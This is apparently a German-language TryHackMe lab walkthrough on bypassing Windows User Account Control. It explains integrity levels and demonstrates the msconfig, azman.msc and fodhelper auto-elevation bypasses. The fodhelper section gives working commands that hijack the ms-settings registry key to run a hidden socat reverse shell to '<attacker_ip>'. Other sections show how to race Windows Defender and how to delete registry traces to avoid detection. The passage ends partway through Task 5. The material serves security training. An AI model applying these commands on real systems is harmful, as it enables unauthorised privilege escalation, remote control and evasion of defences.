# Task 1 - Einführung
In diesem Raum werden wir uns mit gängigen Methoden befassen, um eine Sicherheitsfunktion zu umgehen, die in Windows-Systemen als **Benutzerkontensteuerung** Englisch - **User Account Control** (**UAC**) bekannt ist. Diese Funktion ermöglicht es jedem Prozess, unabhängig davon, wer ihn ausführt (ein normaler Benutzer oder ein Administrator), mit geringen Privilegien ausgeführt zu werden.

Aus der Perspektive eines Angreifers ist es entscheidend, die UAC zu umgehen, um aus stark eingeschränkten Umgebungen auszubrechen und vollständig Berechtigungen auf Zielrechnern zu erlangen. Während wir die Umgehungstechniken erlernen, werden wir auch auf mögliche Alarme achten, die ausgelöst werden könnten, und Artefakte betrachten, die auf dem Zielsystem entstehen könnten und die das Blue Team erkennen könnte.

### Raumziele

- Erlernen der verschiedenen Techniken, die Angreifer verwenden können, um die UAC zu umgehen.

### Voraussetzungen für diesen Raum

Es wird empfohlen, vorher den [Windows Internals](https://tryhackme.com/r/room/windowsinternals) Raum durchzugehen.

# Task 2 - User Account Control (UAC)
### Was ist UAC?
User Account Control (UAC) ist eine Windows-Sicherheitsfunktion, die bewirkt, dass jeder neue Prozess standardmäßig im Sicherheitskontext eines nicht privilegierten Kontos ausgeführt wird. Diese Richtlinie gilt für Prozesse, die von jedem Benutzer gestartet werden, einschließlich der Administratoren selbst. Die Idee dahinter ist, dass wir uns nicht allein auf die Identität des Benutzers verlassen können, um zu bestimmen, ob bestimmte Aktionen autorisiert werden sollten.

Obwohl dies auf den ersten Blick kontraproduktiv erscheinen mag, stellen Sie sich folgendes Szenario vor: Benutzer BOB lädt unwissentlich eine bösartige Anwendung aus dem Internet herunter. Wenn BOB Teil der Administratorengruppe ist, erbt jede von ihm gestartete Anwendung die Zugriffsrechte seines Zugriffstokens. Wenn also BOB beschließt, die bösartige Anwendung zu starten und UAC deaktiviert ist, würde die bösartige Anwendung sofort Administratorrechte erlangen. Stattdessen wird die bösartige Anwendung eingeschränkt auf ein Zugriffstoken ohne Administratorrechte beschränkt, wenn UAC aktiviert ist.

### UAC Elevation

Wenn ein Administrator für eine privilegierte Aufgabe erforderlich ist, bietet UAC eine Möglichkeit zur Erhöhung der Rechte. Die **Erhöhung** funktioniert, indem dem Benutzer ein einfaches Dialogfeld angezeigt wird, um zu bestätigen, dass er ausdrücklich zustimmt, die Anwendung im administrativen Sicherheitskontext auszuführen:  
![2024-07-08-8088062c5a8e61407d343186bba02596.png](Bilder/2024-07-08-8088062c5a8e61407d343186bba02596.png)

### Integritätsstufen

UAC ist eine **Mandatory Integrity Control** (**MIC**), ein Mechanismus, der es ermöglicht, Benutzer, Prozesse und Ressourcen durch Zuweisung einer **Integritätsstufe** (**IL**) voneinander zu unterscheiden. Im Allgemeinen können Benutzer oder Prozesse mit einem höheren IL-Zugriffstoken auf Ressourcen mit niedrigeren oder gleichen ILs zugreifen. MIC hat Vorrang vor den regulären Windows-DACLs (Discretionary Access Control Lists), daher kann es sein, dass Sie gemäß der DACL auf eine Ressource zugreifen dürfen, aber es spielt keine Rolle, wenn Ihre IL nicht hoch genug ist.

Windows verwendet die folgenden 4 ILs, geordnet von niedrigster bis höchster:
| Integritätsstufe | Verwendung |
| -----------------|----------- |
| Niedrig | Wird üblicherweise für die Interaktion mit dem Internet verwendet (z. B. Internet Explorer). Hat sehr begrenzte Berechtigungen.|
| Mittel | Wird Standardbenutzern und Administratoren mit gefilterten Tokens zugewiesen. |
| Hoch | Wird von Administratoren mit erhöhten Tokens verwendet, wenn UAC aktiviert ist. Wenn UAC deaktiviert ist, verwenden alle Administratoren immer ein Token mit hoher IL.|
| System | Reserviert für den Systemgebrauch. |

Wenn ein Prozess auf eine Ressource zugreifen muss, erbt er das Zugriffstoken des aufrufenden Benutzers und die damit verbundene IL. Dasselbe geschieht, wenn ein Prozess einen Kindprozess erzeugt.

Gefilterte Tokens

Um diese Rollentrennung zu erreichen, behandelt UAC normale Benutzer und Administratoren während der Anmeldung etwas unterschiedlich:

- **Nicht-Administratoren** erhalten bei der Anmeldung ein einzelnes Zugriffstoken, das für alle vom Benutzer durchgeführten Aufgaben verwendet wird. Dieses Token hat eine mittlere IL.
- **Administratoren** erhalten zwei Zugriffstoken:
    - **Gefiltertes Token**: Ein Token, dem Administratorrechte entzogen wurden, das für reguläre Operationen verwendet wird. Dieses Token hat eine mittlere IL.
    - **Erhöhtes Token**: Ein Token mit vollen Administratorrechten, das verwendet wird, wenn etwas mit administrativen Rechten ausgeführt werden muss. Dieses Token hat eine hohe IL.

Auf diese Weise verwenden Administratoren ihr gefiltertes Token, es sei denn, sie fordern explizit über UAC administrative Berechtigungen an.

### Öffnen einer Anwendung auf übliche Weise

Wenn wir versuchen, eine normale Konsole zu öffnen, können wir sie entweder als nicht privilegierter Benutzer oder als Administrator öffnen. Abhängig von unserer Wahl wird dem gestarteten Prozess entweder ein Token mit mittlerer oder hoher Integritätsstufe zugewiesen:    
![2024-07-08-85532945ffd962373592d21f1720ee39.png](Bilder/2024-07-08-85532945ffd962373592d21f1720ee39.png)

Wenn wir beide Prozesse mit dem Process Hacker analysieren, können wir die zugehörigen Tokens und ihre Unterschiede sehen:  
![2024-07-08-605235aa87c2f39689d0396bb3603967.png](Bilder/2024-07-08-605235aa87c2f39689d0396bb3603967.png)

Links sehen Sie ein gefiltertes Token mit mittlerem IL und kaum zugewiesenen Berechtigungen. Rechts können Sie sehen, dass der Prozess mit hohem IL läuft und wesentlich mehr Berechtigungen zur Verfügung hat. Ein weiterer Unterschied, der vielleicht nicht so offensichtlich ist, besteht darin, dass der Prozess mit mittlerem IL effektiv jegliche Berechtigungen verweigert sind, die mit der Zugehörigkeit zur Administratorengruppe zusammenhängen.

### UAC-Einstellungen

Je nach unseren Sicherheitsanforderungen kann UAC auf vier verschiedene Benachrichtigungsstufen eingestellt werden:

- **Immer benachrichtigen**: Benachrichtigen und zur Autorisierung auffordern, wenn Änderungen an den Windows-Einstellungen vorgenommen werden oder wenn ein Programm versucht, Anwendungen zu installieren oder Änderungen am Computer vorzunehmen.
- **Benachrichtigen, wenn Programme versuchen, Änderungen am Computer vorzunehmen**: Benachrichtigen und zur Autorisierung auffordern, wenn ein Programm versucht, Anwendungen zu installieren oder Änderungen am Computer vorzunehmen. Administratoren werden nicht zur Autorisierung aufgefordert, wenn sie Windows-Einstellungen ändern.
- **Benachrichtigen, wenn Programme versuchen, Änderungen am Computer vorzunehmen (Desktop nicht abdunkeln)**: Wie oben, aber der UAC-Prompt wird nicht auf einem sicheren Desktop ausgeführt.
-** Nie benachrichtigen**: UAC-Prompt deaktivieren. Administratoren führen alles mit einem Token hoher Privilegien aus.

Standardmäßig ist UAC auf die **Benachrichtigen, wenn Programme versuchen, Änderungen am Computer vorzunehmen-Ebene** eingestellt.  
![2024-07-08-143a6c0fd6725edaee0f3d5c707e97f0.png](Bilder/2024-07-08-143a6c0fd6725edaee0f3d5c707e97f0.png)

Vom Standpunkt eines Angreifers aus betrachtet sind die drei niedrigeren Sicherheitsstufen äquivalent, und nur die Einstellung "Immer benachrichtigen" stellt einen Unterschied dar.

UAC-Internas

Im Kern von UAC haben wir den Anwendungsinformationsdienst oder Appinfo. Wenn ein Benutzer eine Erhöhung benötigt, geschieht Folgendes:

1. Der Benutzer fordert an, eine Anwendung als Administrator auszuführen.
2. Ein Aufruf der ShellExecute-API mit dem Verb "runas" wird gemacht.
3. Die Anfrage wird an Appinfo weitergeleitet, um die Erhöhung zu handhaben.
4. Es wird überprüft, ob im Anwendungsmanifest die AutoElevation erlaubt ist (mehr dazu später).
5. Appinfo führt consent.exe aus, die den UAC-Prompt auf einem sicheren Desktop anzeigt. Ein sicherer Desktop ist einfach ein separater Desktop, der Prozesse von dem isoliert, was auf dem tatsächlichen Desktop des Benutzers läuft, um zu verhindern, dass andere Prozesse den UAC-Prompt auf irgendeine Weise manipulieren.
6. Wenn der Benutzer zustimmt, die Anwendung als Administrator auszuführen, wird der Appinfo-Dienst die Anfrage mit einem erhöhten Token des Benutzers ausführen. Anschließend setzt Appinfo die Elternprozess-ID des neuen Prozesses so, dass sie auf die Shell zeigt, von der aus die Erhöhung angefordert wurde.  
![2024-07-010-fce906f0e438efa938753430e5d25afe.png](2024-07-010-fce906f0e438efa938753430e5d25afe.png)

### Umgehung der Benutzerkontensteuerung (UAC)

Aus der Perspektive eines Angreifers gibt es möglicherweise Situationen, in denen Sie eine entfernte Shell zu einem Windows-Host über Powershell oder cmd.exe erhalten. Möglicherweise haben Sie sogar Zugriff über ein Konto, das Teil der Administratorengruppe ist. Wenn Sie jedoch versuchen, einen Hintertür-Benutzer für zukünftigen Zugriff zu erstellen, erhalten Sie folgenden Fehler:
```powershell
PS C:\Users\attacker> net user backdoor Backd00r /add
System error 5 has occurred.

Access is denied.
```

Indem wir unsere zugewiesenen Gruppen überprüfen, können wir bestätigen, dass unsere Sitzung mit einem mittleren IL läuft, was bedeutet, dass wir effektiv ein gefiltertes Token verwenden:
```powershell
PS C:\Users\attacker> whoami /groups
	
GROUP INFORMATION
-----------------

Group Name                                                    Attributes
============================================================= ==================================================
Everyone                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Group used for deny only
BUILTIN\Administrators                                        Group used for deny only
BUILTIN\Users                                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level
```

Even wenn wir eine Powershell-Sitzung mit einem administrativen Benutzer öffnen, hindert uns die Benutzerkontensteuerung (UAC) daran, administrative Aufgaben auszuführen, da wir momentan nur ein gefiltertes Token verwenden. Um volle Kontrolle über unser Ziel zu erlangen, müssen wir die UAC umgehen.

Interessanterweise betrachtet Microsoft die UAC nicht als Sicherheitsgrenze, sondern eher als eine einfache Annehmlichkeit für den Administrator, um unnötiges Ausführen von Prozessen mit administrativen Rechten zu vermeiden. In diesem Sinne dient der UAC-Prompt eher als Erinnerung für den Benutzer, dass er mit hohen Privilegien arbeitet, anstatt Malware oder einem Angreifer den Zugriff zu erschweren. Da es keine Sicherheitsgrenze ist, werden Umgehungstechniken nicht als Sicherheitslücke von Microsoft betrachtet, weshalb einige davon bis heute ungepatcht sind.

Im Allgemeinen basieren die meisten Umgehungstechniken darauf, dass wir in der Lage sind, einen Prozess mit einem hohen Integritätslevel (IL) zu nutzen, um etwas in unserem Auftrag auszuführen. Da jeder Prozess, der von einem Elternprozess mit hohem IL erstellt wird, das gleiche Integritätsniveau erbt, genügt dies, um ein erhöhtes Token zu erhalten, ohne dass wir den UAC-Prompt durchlaufen müssen.

In allen Szenarien, die in diesem Kontext behandelt werden, gehen wir davon aus, dass wir Zugriff auf den Server mit einem administrativen Konto haben, jedoch nur über eine Konsole mit mittlerem IL. Unser Ziel ist es immer, Zugang zu einer Konsole mit hohem IL zu erlangen, ohne die UAC zu umgehen.

## Fragen:
Was ist das höchste Integritätslevel (IL), das auf Windows verfügbar ist?
```

```

Welches IL ist mit einem erhöhten Token eines Administrators verbunden?
```

```

Wie lautet der vollständige Name des Dienstes, der für die Verarbeitung von UAC-Erhebungsanfragen zuständig ist?
```

```

# Task 3 - UAC: GUI-basierte Umgehungen
Wir werden damit beginnen, uns GUI-basierte Umgehungen anzuschauen, da sie eine einfache Möglichkeit bieten, die grundlegenden Konzepte zu verstehen. Diese Beispiele sind normalerweise nicht auf reale Szenarien anwendbar, da sie darauf basieren, dass wir Zugang zu einer grafischen Sitzung haben, von der aus wir die Standard-UAC zur Erhöhung verwenden könnten.

Klicken Sie auf die Schaltfläche "Start Machine", um Ihre virtuelle Maschine bereitzustellen und eine Verbindung dazu herzustellen, entweder über RDP oder im Nebeneinander-Ansicht im Browser:

xfreerdp /v:MACHINE_IP /u:attacker /p:Password321

Diese Maschine wird für alle Aufgaben in diesem Raum verwendet werden.


Fallstudie: msconfig

Unser Ziel ist es, Zugang zu einer Eingabeaufforderung mit hohem Integritätslevel zu erlangen, ohne die UAC zu durchlaufen. Zuerst öffnen wir msconfig, entweder über das Startmenü oder das Dialogfeld "Ausführen":  
![2024-07-08-30570f96439f9de572fe97ba508ccdfa.png](Bilder/2024-07-08-30570f96439f9de572fe97ba508ccdfa.png)

Wenn wir den msconfig-Prozess mit dem Process Hacker analysieren (verfügbar auf Ihrem Desktop), bemerken wir etwas Interessantes. Selbst wenn uns kein UAC-Prompt angezeigt wurde, läuft msconfig als Prozess mit hohem Integritätslevel:  
![2024-07-08-478a3577ffcd0c186529d9edd34545f4.png](Bilder/2024-07-08-478a3577ffcd0c186529d9edd34545f4.png)

Das ist dank einer Funktion namens automatische Erhebung möglich, die bestimmten Binärdateien ermöglicht, sich ohne Interaktion des Benutzers zu erhöhen. Weitere Details dazu folgen später.

Wenn es uns gelingen würde, msconfig dazu zu bringen, eine Shell für uns zu starten, würde die Shell dasselbe Zugriffstoken erben, das von msconfig verwendet wird, und daher als Prozess mit hohem Integritätslevel ausgeführt werden. Indem wir zum Register "Tools" navigieren, finden wir eine Option, genau das zu tun:  
![204-07-08-efbc49a8c7acfe3f296d0cb46cd2f75a.png](Bilder/204-07-08-efbc49a8c7acfe3f296d0cb46cd2f75a.png)

Wenn wir auf "Launch" klicken, erhalten wir eine Eingabeaufforderung mit hohem Integritätslevel, ohne dabei mit der UAC in irgendeiner Weise interagieren zu müssen.
```powershell
C:\> C:\flags\GetFlag-msconfig.exe
```

### Fallstudie: azman.msc

Wie bei msconfig erfolgt bei azman.msc eine automatische Erhebung ohne Benutzerinteraktion. Wenn es uns gelingt, eine Shell aus diesem Prozess heraus zu starten, umgehen wir die UAC. Beachten Sie, dass azman.msc im Gegensatz zu msconfig keinen vorgesehenen eingebauten Weg hat, um eine Shell zu starten. Dies können wir jedoch leicht mit etwas Kreativität überwinden.

Lassen Sie uns zuerst azman.msc ausführen:
Um die msconfig-Flagge abzurufen, verwenden Sie die erlangte Konsole mit hohem Integritätslevel, um folgendes auszuführen:  
![2024-07-08-769ef59be8fc62884e69a0b39422b2a5.png](Bilder/2024-07-08-769ef59be8fc62884e69a0b39422b2a5.png)

Wir können bestätigen, dass ein Prozess mit hohem Integritätslevel gestartet wurde, indem wir den Process Hacker verwenden. Beachten Sie, dass alle .msc Dateien von mmc.exe (Microsoft Management Console) ausgeführt werden:  
![2024-07-08-2fd110f80a236ea5bbb06518b519b440.png](Bilder/2024-07-08-2fd110f80a236ea5bbb06518b519b440.png)

Um eine Shell auszuführen, werden wir die Hilfe der Anwendung missbrauchen:  
![204-07-08-2f1aef0aa39ffcf9056999c939e43b8d.png](Bilder/204-07-08-2f1aef0aa39ffcf9056999c939e43b8d.png)

Auf dem Hilfemenü werden wir mit der rechten Maustaste auf einen beliebigen Teil des Hilfeartikels klicken und **Quelltext anzeigen** auswählen:  
![2024-07-08-43e3967d4cdb4c30dc46e7ce81eb2825.png](Bilder/2024-07-08-43e3967d4cdb4c30dc46e7ce81eb2825.png)

Dies wird einen Notepad-Prozess erzeugen, den wir nutzen können, um eine Shell zu erhalten. Gehen Sie dazu zu **Datei** **->** **Öffnen** und stellen Sie sicher, dass Sie "Alle Dateien" in der Kombinationsbox unten rechts auswählen. Navigieren Sie zu `C:\Windows\System32` und suchen Sie nach `cmd.exe`. Klicken Sie mit der rechten Maustaste, um "Öffnen" auszuwählen:  
![2024-07-08-8ae24b569d5d95119e79feb425e1b7ff.png](Bilder/2024-07-08-8ae24b569d5d95119e79feb425e1b7ff.png)

Dies wird erneut die UAC umgehen und uns Zugang zu einer Eingabeaufforderung mit hoher Integrität geben. Sie können den Prozessbaum im Process Hacker überprüfen, um zu sehen, wie das Zugriffstoken mit hoher Integrität von mmc (Microsoft Management Console, gestartet über Azman) bis zu cmd.exe weitergereicht wird:  
![2024-07-08-7fb637209e08c712615b992b9d0533ca.png](Bilder/2024-07-08-7fb637209e08c712615b992b9d0533ca.png)

Um die Azman-Flagge abzurufen, verwenden Sie die erlangte Konsole mit hoher Integrität, um Folgendes auszuführen:
```powershell
C:\> C:\flags\GetFlag-azman.exe
```

## Fragen:
Welche Flagge wird durch Ausführen des msconfig-Exploits zurückgegeben?
```

```

Welche Flagge wird durch Ausführen des azman.msc-Exploits zurückgegeben?
```

```

# Task 4 - UAC: Prozesse automatisch erhöhen
### AutoElevate

Wie bereits erwähnt, können einige ausführbare Dateien automatisch auf ein hohes IL-Niveau angehoben werden, ohne dass eine Benutzerinteraktion erforderlich ist. Dies gilt für die meisten Funktionen der Systemsteuerung und einige ausführbare Dateien, die mit Windows bereitgestellt werden.

Für eine Anwendung müssen einige Voraussetzungen erfüllt sein, um automatisch aufzusteigen:

- Die ausführbare Datei muss vom Windows-Publisher signiert sein.
- Die ausführbare Datei muss sich in einem vertrauenswürdigen Verzeichnis befinden, wie z.B. `%SystemRoot%/System32/` oder `%ProgramFiles%/`

Je nach Art der Anwendung können zusätzliche Anforderungen gelten:

- Ausführbare Dateien (.exe) müssen das **autoElevate**-Element in ihren Manifesten deklarieren. Um das Manifest einer Datei zu überprüfen, können wir das Tool [sigcheck](https://learn.microsoft.com/en-us/sysinternals/downloads/sigcheck) verwenden, das Teil der Sysinternals-Suite ist. Eine Kopie von sigcheck finden Sie auf Ihrem Rechner unter `C:\tools\`. Wenn wir das Manifest für msconfig.exe überprüfen, finden wir die Eigenschaft autoElevate:
```powershell
C:\tools\> sigcheck64.exe -m c:/windows/system32/msconfig.exe
...
<asmv3:application>
	<asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
		<dpiAware>true</dpiAware>
		<autoElevate>true</autoElevate>
	</asmv3:windowsSettings>
</asmv3:application>
```

- **mmc.exe wird je nach dem .msc-Snap-In, das vom Benutzer angefordert wird, automatisch erhöht. Die meisten .msc-Dateien, die mit Windows mitgeliefert werden, werden automatisch erhöht.
- Windows führt eine zusätzliche Liste von ausführbaren Dateien, die auch dann automatisch erhöht werden, wenn sie nicht im Manifest angefordert werden. Diese Liste umfasst beispielsweise pkgmgr.exe und spinstall.exe.
- COM-Objekte können ebenfalls eine automatische Erhebung durch Konfiguration bestimmter [Registrierungsschlüssel anfordern](https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker).

### Fallstudie: Fodhelper

Fodhelper.exe ist eine der standardmäßigen ausführbaren Dateien von Windows, die für die Verwaltung optionaler Windows-Funktionen zuständig ist, einschließlich zusätzlicher Sprachen, Anwendungen, die nicht standardmäßig installiert sind, oder anderer Betriebssystemmerkmale. Wie die meisten Programme zur Systemkonfiguration kann fodhelper bei Verwendung der Standard-UAC-Einstellungen automatisch erhöht werden, sodass Administratoren nicht zur Erhöhung aufgefordert werden, wenn sie Standardadministrationsaufgaben ausführen. Während wir bereits eine autoElevate-Executable betrachtet haben, kann fodhelper im Gegensatz zu msconfig missbraucht werden, ohne Zugang zu einer grafischen Benutzeroberfläche zu haben.  
![2024-07-08-705cefc6711f050b45a6f1af4019a679.png](Bilder/2024-07-08-705cefc6711f050b45a6f1af4019a679.png)

Von der Perspektive eines Angreifers aus betrachtet bedeutet dies, dass es über eine Remote-Shell mit mittlerer Integrität verwendet werden kann und in einen voll funktionsfähigen Prozess mit hoher Integrität umgewandelt werden kann. Diese spezielle Technik wurde von [@winscripting](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/) entdeckt und wurde bereits von der [Glupteba-Malware](https://www.cybereason.com/blog/research/glupteba-expands-operation-and-toolkit-with-lolbins-cryptominer-and-router-exploit) in freier Wildbahn eingesetzt.

Was an fodhelper bemerkt wurde, ist, dass es die Registry nach einem spezifischen interessanten Schlüssel durchsucht:  
![2024-07-08-eb7ac876cd05f51495f9882fa00ef832.png](Bilder/2024-07-08-eb7ac876cd05f51495f9882fa00ef832.png)

Wenn Windows eine Datei öffnet, überprüft es die Registrierung, um zu erfahren, welche Anwendung verwendet werden soll. Die Registrierung enthält einen Schlüssel namens Programmatic ID (**ProgID**) für jeden Dateityp, wo die entsprechende Anwendung zugeordnet ist. Angenommen, Sie versuchen, eine HTML-Datei zu öffnen. Ein Teil der Registrierung, bekannt als **HKEY_CLASSES_ROOT**, wird überprüft, damit das System weiß, dass es Ihren bevorzugten Webclient verwenden muss, um sie zu öffnen. Der Befehl zur Verwendung wird unter dem Unterschlüssel `shell/open/command` für jedes ProgID der Datei angegeben. Nehmen wir den ProgID "htmlfile" als Beispiel:  
![2024-07-08-2428d786ec68d8731dc98b6598211eb9.png](Bilder/2024-07-08-2428d786ec68d8731dc98b6598211eb9.png)

In Wirklichkeit ist HKEY_CLASSES_ROOT nur eine zusammengeführte Ansicht von zwei verschiedenen Pfaden in der Registrierung:
| Path                                  | Beschreibung                            |
|---------------------------------------|-----------------------------------------|
| HKEY_LOCAL_MACHINE\Software\Classes    | Systemweite Dateizuordnungen            |
| HKEY_CURRENT_USER\Software\Classes     | Dateizuordnungen des aktiven Benutzers  |

Beim Überprüfen von HKEY_CLASSES_ROOT hat eine benutzerspezifische Zuordnung unter **HKEY_CURRENT_USER (HKCU)** Vorrang. Falls keine benutzerspezifische Zuordnung konfiguriert ist, wird stattdessen die systemweite Zuordnung unter **HKEY_LOCAL_MACHINE (HKLM)** verwendet. Auf diese Weise kann jeder Benutzer separat seine bevorzugten Anwendungen auswählen, wenn gewünscht.

Zurück zu fodhelper sehen wir nun, dass versucht wird, eine Datei unter dem ProgID ms-settings zu öffnen. Durch das Erstellen einer Zuordnung für diesen ProgID im Kontext des aktuellen Benutzers unter HKCU überschreiben wir die standardmäßige systemweite Zuordnung und kontrollieren somit, welcher Befehl zur Dateiöffnung verwendet wird. Da fodhelper ein autoElevate-Executable ist, erbt jeder von ihm gestartete Unterprozess ein Token mit hoher Integrität und umgeht somit effektiv die UAC.

### Alles zusammengefasst:

Einer unserer Agenten hat für Ihre Bequemlichkeit eine Hintertür auf dem Zielserver platziert. Er konnte ein Konto innerhalb der Administratorengruppe erstellen, jedoch verhindert UAC die Ausführung privilegierter Aufgaben. Um die Flagge zu erhalten, benötigt er, dass Sie die UAC umgehen und eine voll funktionsfähige Shell mit hoher Integrität erhalten.

Um sich mit der Hintertür zu verbinden, können Sie folgenden Befehl verwenden:

`nc MACHINE_IP 9999`

Sobald verbunden, überprüfen wir, ob unser Benutzer Teil der Administratorengruppe ist und dass er mit einem Token mittlerer Integrität läuft:
```shell
user@kali$ nc MACHINE_IP 9999
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
myserver\attacker

C:\Windows\system32>net user attacker | find "Local Group"
Local Group Memberships      *Administrators       *Users                

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
```

Wir setzen die erforderlichen Registrierungswerte, um die Klasse ms-settings mit einer Reverse Shell zu verknüpfen. Zur Vereinfachung finden Sie eine Kopie von **socat** unter `c:\tools\socat\`. Sie können die folgenden Befehle verwenden, um die erforderlichen Registrierungsschlüssel von einer Standard-Eingabeaufforderung aus festzulegen:
```cmd
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\> reg add %REG_KEY% /d %CMD% /f
The operation completed successfully.
```

Beachten Sie, dass wir einen leeren Wert namens **DelegateExecute** erstellen müssen, damit die Klassenverknüpfung wirksam wird. Wenn dieser Registrierungswert nicht vorhanden ist, wird das Betriebssystem den Befehl ignorieren und stattdessen die systemweite Klassenverknüpfung verwenden.

Wir richten einen Listener auf unserem Rechner mit netcat ein:

`nc -lvp 4444`

Anschließend führen wir **fodhelper.exe** aus, was wiederum die Ausführung unserer Reverse Shell auslöst:  
![2024-07-08-2f1aef0aa39ffcf9056999c999e43b8d.png](Bilder/2024-07-08-2f1aef0aa39ffcf9056999c999e43b8d.png)

Die empfangene Shell läuft mit hoher Integrität, was anzeigt, dass wir die Benutzerkontensteuerung (UAC) erfolgreich umgangen haben.

Um die "fodhelper"-Flagge abzurufen, verwenden Sie Ihre neue Shell und führen Sie aus:
```cmd
C:\> C:\flags\GetFlag-fodhelper.exe
```

**Hinweis: Beachten Sie, dass die Flagge nur zurückgegeben wird, wenn Sie UAC erfolgreich über "fodhelper" umgangen haben und nur von der resultierenden Shell mit hoher Integrität.**


### Spuren beseitigen

Durch die Ausführung dieses Exploits wurden einige Artefakte in Form von Registrierungsschlüsseln auf dem Zielsystem erstellt. Um eine Erkennung zu vermeiden, müssen wir die Spuren mit dem folgenden Befehl beseitigen:
```cmd
reg delete HKCU\Software\Classes\ms-settings\ /f
```

**Hinweis: Stellen Sie sicher, dass Sie den angegebenen Befehl ausführen, um zu vermeiden, dass Artefakte die folgenden Aufgaben beeinträchtigen.**

## Fragen:
Welche Flagge wird durch die Ausführung des "fodhelper"-Exploits zurückgegeben?
```

```

# Task 5 - UAC: Verbesserung des Fodhelper-Exploits zur Umgehung von Windows Defender
### Windows Defender

Zur Vereinfachung ist auf dem Zielrechner Windows Defender deaktiviert. Was würde jedoch passieren, wenn er aktiviert wäre?

Gehen Sie zunächst über Ihre GUI-Verbindung zu Ihrem Desktop und doppelklicken Sie auf das folgende Symbol, um Windows Defender zu aktivieren:  
![2024-07-08-a138ccd399c27bb922efcc266053c3a3.png](Bilder/2024-07-08-a138ccd399c27bb922efcc266053c3a3.png)

Versuchen Sie nun erneut, "fodhelper" über die Backdoor-Verbindung auszunutzen, und beobachten Sie, was auf der GUI des Servers passiert. Sobald Sie den `(Default)` Wert in `HKCU\Software\Classes\ms-settings\Shell\Open\command` ändern, um Ihren Reverse-Shell-Befehl einzufügen, erscheint eine Windows Defender-Benachrichtigung:  
![2024-07-08-9ebebccbac675f6b66f98a16446d1859.png](Bilder/2024-07-08-9ebebccbac675f6b66f98a16446d1859.png)

Wenn Sie die Benachrichtigung anklicken, können Sie die Details des Alarms einsehen, die einen UAC-Umgehungsversuch durch Ändern eines Registrierungswertes erwähnen:  
![2024-07-08-8faadca4b214e13d32a6e7979554dcdc.png](Bilder/2024-07-08-8faadca4b214e13d32a6e7979554dcdc.png)

Wenn Sie den entsprechenden Wert in der Registrierung abfragen, werden Sie feststellen, dass er gelöscht wurde:
```cmd
C:\Windows\system32>reg query %REG_KEY% /v ""

HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
    (Default)    REG_SZ    (value not set)
```

Obwohl es nun so aussieht, als würde unser Exploit mit aktiviertem Windows Defender nicht funktionieren, prüfen Sie, was passiert, wenn Sie die gleichen Befehle mit einer kleinen Änderung ausführen (stellen Sie sicher, dass Sie Ihre IP-Adresse entsprechend ersetzen):
```cmd
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\> reg add %REG_KEY% /d %CMD% /f & reg query %REG_KEY%
HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
    DelegateExecute    REG_SZ    
    (Default)    REG_SZ    powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes
```

Wir haben eine schnelle Abfrage des beanstandeten Registrierungswertes unmittelbar nach dem Setzen auf den für unsere Reverse-Shell erforderlichen Befehl hinzugefügt. Überraschenderweise gibt die Abfrage unseren Befehl unverändert zurück. Wir werden weiterhin von Windows Defender benachrichtigt, und eine Sekunde später wird der beanstandete Registrierungswert wie erwartet gelöscht. Es scheint, dass Windows Defender einen Moment braucht, um auf unseren Exploit zu reagieren. Stellen Sie also einen Reverse-Listener auf dem Angreifer-Rechner ein:
`nc -lvp 4444`

Und ändern Sie den Exploit so, dass "fodhelper.exe" sofort nach dem Setzen des Registrierungswertes ausgeführt wird. Wenn der Befehl schnell genug ausgeführt wird, funktioniert es einfach (stellen Sie sicher, dass Sie Ihre IP-Adresse entsprechend ersetzen):
```cmd
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\> reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
```

Je nach Glück könnte "fodhelper" ausgeführt werden, bevor der Virenschutz anspringt, und Ihnen eine Reverse-Shell zurückgeben. Falls es aus irgendeinem Grund nicht funktioniert, beachten Sie, dass diese Methode unzuverlässig ist, da sie von einem Wettlauf zwischen dem Virenschutz und der Ausführung Ihres Payloads abhängt. Sollte die Reverse-Shell nicht funktionieren, fahren Sie einfach mit dem Rest der Anleitung fort, da weiter unten eine konsistentere Methode zur Umgehung von Windows Defender vorgestellt wird.
```shell
user@kali$ nc -lvp 4444      
Listening on 0.0.0.0 4444
Connection received on 10.10.183.127 49813
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /groups | find "Label"
